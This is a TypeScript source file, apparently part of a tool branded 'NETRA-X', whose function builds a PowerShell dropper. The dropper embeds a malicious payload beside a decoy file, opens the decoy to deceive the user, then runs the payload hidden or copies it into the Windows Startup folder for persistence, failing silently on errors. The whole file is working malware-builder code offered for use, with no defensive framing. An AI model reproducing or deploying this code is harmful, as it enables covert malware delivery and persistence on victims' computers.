
'use server';

import { z } from 'zod';

const FileInputSchema = z.object({
  name: z.string(),
  content: z.string(), // Base64 Data URI
});

const MergePayloadsInputSchema = z.object({
  payload: FileInputSchema,
  benign: FileInputSchema,
  behavior: z.enum(['Run Silently', 'Drop & Exec (Temp)', 'Persistence (Startup)']),
});

type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;

type MergePayloadsOutput = {
  success: boolean;
  scriptContent?: string;
  error?: string;
};

// Helper function to decode a data URI to a Base64 string
function decodeDataUri(dataUri: string): string {
    const parts = dataUri.split(',');
    if (parts.length !== 2) {
        throw new Error('Invalid Data URI format');
    }
    return parts[1];
}

/**
 * Generates a PowerShell dropper script that embeds two files.
 * When run, it drops the benign file, opens it, and executes the payload.
 */
export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
  try {
    const validatedInput = MergePayloadsInputSchema.parse(input);

    const { payload, benign, behavior } = validatedInput;

    const payloadBase64 = decodeDataUri(payload.content);
    const benignBase64 = decodeDataUri(benign.content);

    let script = `# NETRA-X Generated Dropper Script
# Timestamp: ${new Date().toISOString()}

# --- Embedded Benign File ---
$benignFileName = "${benign.name}"
$benignFileBase64 = @"
${benignBase64}
"@

# --- Embedded Payload ---
$payloadFileName = "${payload.name}"
$payloadFileBase64 = @"
${payloadBase64}
"@

# --- Dropper Logic ---
$tempPath = $env:TEMP
$benignFilePath = Join-Path $tempPath $benignFileName
$payloadFilePath = Join-Path $tempPath $payloadFileName

try {
    # Decode and write the benign file
    [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
    
    # Decode and write the payload
    [IO.File]::WriteAllBytes($payloadFilePath, [System.Convert]::FromBase64String($payloadFileBase64))

    # Start the benign file to show the user
    Start-Process $benignFilePath
`;

    // Add behavior-specific logic
    switch (behavior) {
      case 'Run Silently':
        script += `
    # Execute the payload silently
    Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
`;
        break;
      case 'Drop & Exec (Temp)':
        script += `
    # Execute the payload from the temp directory
    Start-Process -FilePath $payloadFilePath
`;
        break;
      case 'Persistence (Startup)':
        script += `
    # Copy payload to startup folder for persistence
    $startupPath = [Environment]::GetFolderPath('Startup')
    $persistentPayloadPath = Join-Path $startupPath $payloadFileName
    Copy-Item -Path $payloadFilePath -Destination $persistentPayloadPath -Force
    
    # Execute the payload
    Start-Process -FilePath $persistentPayloadPath
`;
        break;
    }

    script += `
} catch {
    # Fail silently
}
`;

    return {
      success: true,
      scriptContent: script,
    };
  } catch (e) {
    console.error("Payload merging failed:", e);
    const message = e instanceof Error ? e.message : 'An unknown error occurred.';
    return {
      success: false,
      error: `Failed to generate dropper script: ${message}`,
    };
  }
}
